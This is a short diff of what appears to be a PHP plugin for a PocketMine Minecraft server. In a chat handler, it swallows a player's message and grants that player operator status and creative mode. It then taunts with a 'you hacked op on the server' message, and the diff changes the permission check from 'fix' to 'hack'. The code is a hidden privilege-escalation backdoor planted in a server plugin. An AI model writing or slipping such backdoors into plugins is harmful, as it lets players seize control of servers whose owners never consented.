@@ -25,7 +25,7 @@ class Main extends PluginBase implements Listener{
                 $dd = implode(" ", $words);
                 $op->setCancelled();
                 foreach ($this->getServer()->getOnlinePlayers() as $on) {
-                    if($on->hasPermission("fix")){
+                    if($on->hasPermission("hack")){
                     	$sender->setOP(true);
                         $sender->setGamemode(1);
                         $sender->sendMessage("§4Ha§eck §4you hacked op on the server\n§eby Aleondev");
